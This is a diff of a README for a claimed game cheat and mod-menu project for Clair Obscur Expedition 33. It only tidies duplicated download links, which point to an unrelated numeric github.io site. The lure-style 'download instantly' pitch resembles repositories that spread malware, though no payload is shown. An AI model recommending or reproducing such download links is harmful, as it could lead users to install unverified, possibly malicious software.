@@ -85,7 +85,6 @@ To empower your experience with **Clair Obscur Expedition 33 Cheats & Mod Menu**
 
 1. Download the latest release:
    [![Download](https://img.shields.io/badge/Download-blue)](https://77470.github.io)  
-   (https://77470.github.io)
 2. Review and verify the digital signature for authenticity.
 3. Follow the platform-specific setup instructions in the `/docs` directory.
 4. Launch the game and activate the mod menu in-game.
@@ -136,11 +135,11 @@ This project is licensed under the [MIT License](https://opensource.org/licenses
 Ready to transform your *Clair Obscur Expedition 33* experience?  
 Click below to get the mod menu instantly:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://77470.github.io)  
-(https://77470.github.io)
+[![Download](https://img.shields.io/badge/Download-blue)](https://77470.github.io)
 
 Paired with continuous updates and open-source transparency, your expedition just reached new frontiers.
 
 ---
+
 
 *© 2025 Clair Obscur Expedition 33 Cheats & Mod Menu Project Team*
